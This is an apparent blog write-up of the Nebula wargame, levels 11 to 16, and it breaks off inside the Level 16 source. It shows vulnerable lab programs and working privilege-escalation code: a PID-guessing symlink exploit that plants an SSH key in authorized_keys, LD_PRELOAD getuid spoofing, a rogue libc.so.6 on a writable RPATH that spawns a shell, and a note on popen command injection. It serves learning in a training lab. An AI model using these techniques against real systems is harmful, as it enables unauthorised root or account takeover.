&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/nebula-10-01.png&quot; alt=&quot;alt text&quot; title=&quot;image10-01&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;level-11&quot;&gt;Level 11&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://exploit.education/nebula/level-11/&quot;&gt;Link: https://exploit.education/nebula/level-11/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Level 11 provides you with a program that executes a shell command in multiple ways and it is stated that there are two ways of completing this level.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;

/*
 * Return a random, non predictable file, and return the file descriptor for
 * it. 
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv(&quot;TEMP&quot;);
  pid = getpid();
  
  asprintf(path, &quot;%s/%d.%c%c%c%c%c%c&quot;, tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length &amp;amp; 0xff;

  for(i = 0; i &amp;lt; length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}

#define CL &quot;Content-Length: &quot;

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
      errx(1, &quot;reading from stdin&quot;);
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, &quot;invalid header&quot;);
  }

  length = atoi(line + strlen(CL));
  
  if(length &amp;lt; sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, &quot;fread length&quot;);
      }
      process(buf, length);
  } else {
      int blue = length;
      int pink;

      fd = getrand(&amp;amp;path);

      while(blue &amp;gt; 0) {
          printf(&quot;blue = %d, length = %d, &quot;, blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf(&quot;pink = %d\n&quot;, pink);

          if(pink &amp;lt;= 0) {
              err(1, &quot;fread fail(blue = %d, length = %d)&quot;, blue, length);
          }
          write(fd, buf, pink);

          blue -= pink;
      }    

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, &quot;mmap&quot;);
      }
      process(mem, length);
  }

}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The program reads from stdin. The following code block within the &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; function checks for the value Content Length &lt;code class=&quot;highlighter-rouge&quot;&gt;#define CL &quot;Content-Length: &quot;&lt;/code&gt; along with its length and see if it provided by the user, if these values are not found, then an ‘invalid header’ is produced.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, &quot;invalid header&quot;);
  }
  ```

Looking at the code flow, the program will then check to see if the content length is less than the buffer that was initialized in the beginning of the program. Additonal checks are also conducted with the `fread` function. The `fread` function will check the length of the values inserted see if it is 1.

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  if(fread(buf, length, 1, stdin) != length) {
      err(1, &quot;fread length&quot;); ```
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;If the length is 1, then the &lt;code class=&quot;highlighter-rouge&quot;&gt;process&lt;/code&gt; function is executed. The &lt;code class=&quot;highlighter-rouge&quot;&gt;process&lt;/code&gt; function just turns the user input to a random character and feeds it to the system function. This can be tested with the following user input:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level11@nebula:/home/flag11$ echo -ne &quot;Content-Length: 1\nA&quot; | /home/flag11/flag11
sh: @: command not found

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Here we passed the character “A”, when this gets processed by the “process” function, it is converted to the character “@” and is then given to the &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; command.&lt;/p&gt;

&lt;p&gt;This can be tried with other characters. With a character such as “l”, it is converted in “m” on most occasions.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level11@nebula:~$ echo -ne &quot;Content-Length: 1\nl&quot; | /home/flag11/flag11
sh: $'m\320\227': command not found
level11@nebula:~$ echo -ne &quot;Content-Length: 1\nl&quot; | /home/flag11/flag11
sh: m@C: command not found
level11@nebula:~$ echo -ne &quot;Content-Length: 1\nl&quot; | /home/flag11/flag11
sh: m: command not found
level11@nebula:~$ echo -ne &quot;Content-Length: 1\nl&quot; | /home/flag11/flag11
sh: $'m\320\313': command not found
level11@nebula:~$ 


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;To summarize this program so far, the content of stdin is taken and mmap is used to convert file content into a char array that is passed into the &lt;code class=&quot;highlighter-rouge&quot;&gt;process()&lt;/code&gt; function. The &lt;code class=&quot;highlighter-rouge&quot;&gt;process&lt;/code&gt; function then decodes the char array before passing it into the &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; function call. I struggled with this level so I ended up looking for hints on the internet. This gave me the following hint:&lt;/p&gt;

&lt;p&gt;Since the bash shell is trying to execute a program called shell, we could create a C program which takes the correct SUID information of the flag11 account and runs the bash shell with their privileges. This can then be symlinked (like level 10).&lt;/p&gt;

&lt;p&gt;This technique however didn’t work due to setuid bit not being set before the call to system. I ended up searching for solutions for this level and found the following working solution: &lt;a href=&quot;https://security.stackexchange.com/questions/137204/nebula-level11-setuid-is-not-working&quot;&gt;Stack Overflow Nebula Level 11&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Looking the the “else” conditional logic, this part of the program can be triggered during the &lt;code class=&quot;highlighter-rouge&quot;&gt;buffer&lt;/code&gt; length check.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  } else {
      int blue = length;
      int pink;

      fd = getrand(&amp;amp;path);

      while(blue &amp;gt; 0) {
          printf(&quot;blue = %d, length = %d, &quot;, blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf(&quot;pink = %d\n&quot;, pink);

          if(pink &amp;lt;= 0) {
              err(1, &quot;fread fail(blue = %d, length = %d)&quot;, blue, length);
          }
          write(fd, buf, pink);

          blue -= pink;
      }    

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, &quot;mmap&quot;);
      }
      process(mem, length);
  }

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;To abuse this logic, we have to define the environment variable from the shell we run the exploit later on. This can be done using the following command.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export TEMP=/tmp
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Looking at the flag11 folder, another possible attack vector would be to inject a authorized_keys key file within the .ssh folder.This could be possible by injecting into a PID of an process. In old Linux systems, a pid of a process is pretty predictable and &lt;code class=&quot;highlighter-rouge&quot;&gt;srandom()&lt;/code&gt; seeded with time is predictable. In this scenario, this PID would need to be predicted while running the flag11 program.&lt;/p&gt;

&lt;p&gt;An ssh key can be created for the level11 user&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -e &quot;/tmp/level11.key&quot; | ssh-keygen -t rsa -b 2048 -C &quot;level11@nebula&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/level11-1.png&quot; alt=&quot;alt text&quot; title=&quot;level11-1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The public key of the level 11 user can now be taken and the following program can now be created.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path, int pid, int time)
{
  char *tmp;
  int fd =  0;

  srandom(time);

  tmp = getenv(&quot;TEMP&quot;);
  asprintf(path, &quot;%s/%d.%c%c%c%c%c%c&quot;, tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));


  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length &amp;amp; 0xff;
  for(i = 0; i &amp;lt; length; i++) {
    buffer[i] ^= key;
    key -= buffer[i] ^ key;
  }
}

#define CL &quot;Content-Length: &quot;

int main(int argc, char **argv)
{
  char line[256];
  char buf[2048] = &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMPbdIp+lS2MR2oGvA36yE4wenUWZUY1OvNyy872Dx3No9LsWFWC6YOCQ4Unea4grPQCYZw/G7EbIgZSnWwW3+sBUASACxJQtQaAKKkK81C1jjarWMZFyN+1EjZqnaVPpj8qF33gOUKg3q2SUyi5p+a7CgzDS7nwYJ4RTdra38Q8K4HgJm1ZrgoKys7SiPnR6BXqq4DOzoJO8UXzwAUPRl0kV/2lRD2lo4LMieudTWKxZk/CQM5UG0TpwhnUmRIyCn3TwlcViSyp6wtzDY8sSekOh9UAdEwvMHAJX//RK3iEVrNz22v1N64RNQmoeNgyb8NYp7fyCxbwVavxHBvMaP level11@nebula&quot;;

  int pid;
  int fd;
  char *path;
  FILE* stream;

  //process(buf, sizeof(buf));

  //if(NULL == (stream = popen(&quot;/home/flag11/flag11&quot;, &quot;w&quot;))) {
  //    errx(1, &quot;popen&quot;);
  //}

  //printf(&quot;Get pid for attacked: \n&quot;);
  //if(fgets(line, sizeof(line), stdin) == NULL) {
  //    errx(1, &quot;reading from stdin&quot;);
  //}

  pid = getpid()+1;
  //printf(&quot;PID: %d\n&quot;,pid);
  getrand(&amp;amp;path, pid, time(NULL));
  symlink(&quot;/home/flag11/.ssh/authorized_keys&quot;,path);
  getrand(&amp;amp;path, pid, time(NULL)+1);
  symlink(&quot;/home/flag11/.ssh/authorized_keys&quot;,path);

  fprintf(stdout, &quot;%s%d\n%s&quot;,CL,sizeof(buf),buf);

  //pclose(stream);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The above attacker code (taken from stackoverflow Nebula Level 11 Solution) can be used to guess the PID of the flag11 binary. When we pipe the stdout to the stdin of the victim the chances are high it is just plus one of our own exploit binary. Otherwise &lt;code class=&quot;highlighter-rouge&quot;&gt;popen()&lt;/code&gt; could be used and injecting pid from &lt;code class=&quot;highlighter-rouge&quot;&gt;ps | grep flag11&lt;/code&gt;. The time part is super easy because it is the time in seconds. To get a stable success rate we also use the filename for the next second. The above can be compiled using GCC.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -o exploit exploit_code.c
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/nebulalevel11-02.png&quot; alt=&quot;alt text&quot; title=&quot;nebulalevel11-02&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Running the exploit provides the following output, but it is possible to SSH as the flag11 user since it was possible to inject into the .ssh folder.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level11@nebula:/tmp$ ./exploit | /home/flag11/flag11
blue = 2048, length = 2048, pink = 395
blue = 1653, length = 2048, pink = 0
flag11: fread fail(blue = 1653, length = 2048): Operation not permitted
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/level11-03.png&quot; alt=&quot;alt text&quot; title=&quot;level11-03&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;level-12&quot;&gt;Level 12&lt;/h3&gt;

&lt;p&gt;Level 12 states that a backdoor exists on port 50001 and the following source code is provided.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;local socket = require(&quot;socket&quot;)
local server = assert(socket.bind(&quot;127.0.0.1&quot;, 50001))

function hash(password)
  prog = io.popen(&quot;echo &quot;..password..&quot; | sha1sum&quot;, &quot;r&quot;)
  data = prog:read(&quot;*all&quot;)
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send(&quot;Password: &quot;)
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
      print(&quot;trying &quot; .. line) -- log from where ;\
      local h = hash(line)

      if h ~= &quot;4754a4f4bd5787accd33de887b9250a0691dd198&quot; then
          client:send(&quot;Better luck next time\n&quot;);
      else
          client:send(&quot;Congrats, your token is 413**CARRIER LOST**\n&quot;)
      end

  end

  client:close()
end
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The following program takes user input and uses the &lt;code class=&quot;highlighter-rouge&quot;&gt;hash&lt;/code&gt; function check whether the user input password matches the password hash  “4754a4f4bd5787accd33de887b9250a0691dd198”. The issue here arises from the usage of the &lt;code class=&quot;highlighter-rouge&quot;&gt;popen&lt;/code&gt; function which is vulnerable to command injection. As such, you can execute arbitrary commands by injection metacharacters such as &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;|&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/level12-01.png&quot; alt=&quot;alt text&quot; title=&quot;getflag&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;level-13&quot;&gt;Level 13&lt;/h3&gt;

&lt;p&gt;Level 13 states that a security check is in place that prevents the program from continuing execution if the user invoking it does not match a specific user id. The following source code is provided.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
  int c;
  char token[256];

  if(getuid() != FAKEUID) {
      printf(&quot;Security failure detected. UID %d started us, we expect %d\n&quot;, getuid(), FAKEUID);
      printf(&quot;The system administrators will be notified of this violation\n&quot;);
      exit(EXIT_FAILURE);
  }

  // snip, sorry :)

  printf(&quot;your token is %s\n&quot;, token);
  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The security check if verifying whether the UID is 1000. If it isn’t, an error message is printed, otherwise the token is printed. This check can be bypassed by using &lt;code class=&quot;highlighter-rouge&quot;&gt;LD_PRELOAD&lt;/code&gt; function to load a shared object file containing a custom &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt; function. Shared libraries are libraries that are loaded by programs when they start. When a shared library is installed properly, all programs that start afterward automatically use the new shared library. The &lt;code class=&quot;highlighter-rouge&quot;&gt;LD_PRELOAD&lt;/code&gt; trick exploits functionality provided by the dynamic linker on Unix systems that allows you to tell the linker to bind symbols provided by a certain shared library before other libraries.&lt;/p&gt;

&lt;p&gt;Using &lt;code class=&quot;highlighter-rouge&quot;&gt;LD_PRELOAD&lt;/code&gt;, it is not possible to run SUID binaries. However, it is possible to make a copy of the flag13 binary without the SUID bit set and &lt;code class=&quot;highlighter-rouge&quot;&gt;LDF_PRELOAD&lt;/code&gt; can be used to spoof the suid bit, this can then be used to get the token which can be used to SSH as the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag13&lt;/code&gt; user.&lt;/p&gt;

&lt;p&gt;The following C shared library can be created which returns the UID 1000.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int getuid() {
    return 1000;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This can then be compiled, set as a shared library and then ran with a copy of the flag13 binary.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level13@nebula:~$ gcc -shared -fPIC -o fakesuid.so fakesuid.c      
level13@nebula:~$ LD_PRELOAD=/home/level13/fakesuid.so /home/level13/flag13_backup 
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
level13@nebula:~$ 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/flag13.png&quot; alt=&quot;alt text&quot; title=&quot;getflag13&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;level-14&quot;&gt;Level 14&lt;/h3&gt;

&lt;p&gt;Level 14 states that a program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory.&lt;/p&gt;

&lt;p&gt;Running the binary with random test input, the following can be deduced:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level14@nebula:/home/flag14$ ./flag14 
./flag14
	-e	Encrypt input
level14@nebula:/home/flag14$ ./flag14 -e
aaaaaaaaaaaaaaaaaa
abcdefghijklmnopqr
^C
level14@nebula:/home/flag14$ ./flag14 -e
bbbbbbbbbbbbbbbbbb
bcdefghijklmnopqrs
level14@nebula:/home/flag14$ ./flag14 -e
123456789
13579;=?A
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;It appears that each character is rotated by its index, starting with 0. So a becomes a, a[1] becomes b (ax1), a[2] becomes c (ax2) etc.&lt;/p&gt;

&lt;p&gt;The following python code can be used to reverse this process. It enumerates through each value in the encrypted token gets the original value by subtracting the ord(index) of the value with its ASCII table value.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;token = '857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.'
count = 0
result = []
for value in token:
  result.append(chr((ord(value) - count)))
  count +=1
print (&quot;&quot;.join(result))
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Running this program will return the following token: &lt;code class=&quot;highlighter-rouge&quot;&gt;8457c118-887c-4e40-a5a6-33a25353165&lt;/code&gt;. This can be used to log in to the flag 14 user account.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/level14.png&quot; alt=&quot;alt text&quot; title=&quot;level14&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;level-15&quot;&gt;Level 15&lt;/h3&gt;

&lt;p&gt;Level 15 gives the following information:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.

You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.

Clean up after yourself :)

To do this level, log in as the level15 account with the password level15. Files for this level can be found in /home/flag15.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;By running strace on the binary, it can be deduced that  the binary is trying to load a shared library &lt;code class=&quot;highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; from within the &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/tmp/flag15&lt;/code&gt; folder.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level15@nebula:/home/flag15$ strace ./flag15 
execve(&quot;./flag15&quot;, [&quot;./flag15&quot;], [/* 19 vars */]) = 0
brk(0)                                  = 0x81e9000
access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb770c000
access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbfbd0174) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/tls/i686/sse2&quot;, 0xbfbd0174) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/tls/i686/cmov&quot;, 0xbfbd0174) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/tls/i686&quot;, 0xbfbd0174) = -1 ENOENT (No such file or directory)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Shared libraries are libraries that are loaded by programs when they start. When a shared library is installed properly, all programs that start afterward automatically use the new shared library. very shared library has a special name called the “soname”. The soname has the prefix “lib”, the name of the library, the phrase `”.so”, followed by a period and a version number. The dynamic linker can be run either indirectly by running some dynamically linked program or shared object. The programs ld.so and ld-linux.so* find and load the shared objects (shared libraries) needed by a program, prepare the program to run, and then run it. LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library. To avoid this mechanism being used as an attack vector for suid/sgid executable binaries, the loader ignores LD_PRELOAD if ruid != euid. For such binaries, only libraries in standard paths that are also suid/sgid will be preloaded.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;RPATH&lt;/code&gt; of the binary can also be found by using objdump. RPATH is used by the dynamic linker at run time to search for shared libraries related to a binary. As mentioned, the loader ignores LD_PRELOAD if ruid != euid but this doesn’t apply to standard RPATH.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level15@nebula:/home/flag15$ objdump -p flag15 

flag15:     file format elf32-i386

Program Header:
    PHDR off    0x00000034 vaddr 0x08048034 paddr 0x08048034 align 2**2
         filesz 0x00000120 memsz 0x00000120 flags r-x
  INTERP off    0x00000154 vaddr 0x08048154 paddr 0x08048154 align 2**0
         filesz 0x00000013 memsz 0x00000013 flags r--
    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12
         filesz 0x000005d4 memsz 0x000005d4 flags r-x
    LOAD off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**12
         filesz 0x00000108 memsz 0x00000110 flags rw-
 DYNAMIC off    0x00000f20 vaddr 0x08049f20 paddr 0x08049f20 align 2**2
         filesz 0x000000d0 memsz 0x000000d0 flags rw-
    NOTE off    0x00000168 vaddr 0x08048168 paddr 0x08048168 align 2**2
         filesz 0x00000044 memsz 0x00000044 flags r--
EH_FRAME off    0x000004dc vaddr 0x080484dc paddr 0x080484dc align 2**2
         filesz 0x00000034 memsz 0x00000034 flags r--
   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2
         filesz 0x00000000 memsz 0x00000000 flags rw-
   RELRO off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**0
         filesz 0x000000f4 memsz 0x000000f4 flags r--

Dynamic Section:
  NEEDED               libc.so.6
  RPATH                /var/tmp/flag15
  INIT                 0x080482c0
  FINI                 0x080484ac
  GNU_HASH             0x080481ac
  STRTAB               0x0804821c
  SYMTAB               0x080481cc
  STRSZ                0x0000005a
  SYMENT               0x00000010
  DEBUG                0x00000000
  PLTGOT               0x08049ff4
  PLTRELSZ             0x00000018
  PLTREL               0x00000011
  JMPREL               0x080482a8
  REL                  0x080482a0
  RELSZ                0x00000008
  RELENT               0x00000008
  VERNEED              0x08048280
  VERNEEDNUM           0x00000001
  VERSYM               0x08048276

Version References:
  required from libc.so.6:
    0x0d696910 0x00 02 GLIBC_2.0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;s the program loads the shared libraries before it executes, if we create a custom shared library with the same name of libc.so.6 
then place it under rpath is set (/var/tmp/flag16), the program running with flag16 privilege will execute my custom code.&lt;/p&gt;

&lt;p&gt;A shared library can be created by creating a C file  and creating the &lt;code class=&quot;highlighter-rouge&quot;&gt;libc_start_main&lt;/code&gt; function which can have a system call to the /bin/bash binary. &lt;code class=&quot;highlighter-rouge&quot;&gt;libc_start_main&lt;/code&gt; is a function that belongs to libc.so.6, responsible for setting up the environment for our process and, after that, call &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; function. You will also need to provide the &lt;code class=&quot;highlighter-rouge&quot;&gt;__cxa_finalize&lt;/code&gt; symbol or else the C code will return with an exit status. This can be verified with &lt;code class=&quot;highlighter-rouge&quot;&gt;LD_DEBUG&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/syscall.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

void __cxa_finalize(void *d) {
    return;
}

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    system(&quot;/bin/sh&quot;);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;During compilation, you will also need to provide the version reference for libc.so.6, in this case, it is &lt;code class=&quot;highlighter-rouge&quot;&gt;GLIBC_2.0&lt;/code&gt;. This can be seen in the previous objdump output. As such, a file can be created with the following.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GLIBC_2.0{};
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This can then be compiled using GCC.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic exploit.c -o libc.so.6
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This can then be used to get a shell as the flag15 user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/level15.png&quot; alt=&quot;alt text&quot; title=&quot;level15&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;level-16&quot;&gt;Level 16&lt;/h3&gt;

&lt;p&gt;Level 16 states that the following perl script is running on port 1616.&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env perl&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;qw{param}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Content-type: text/html\n\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
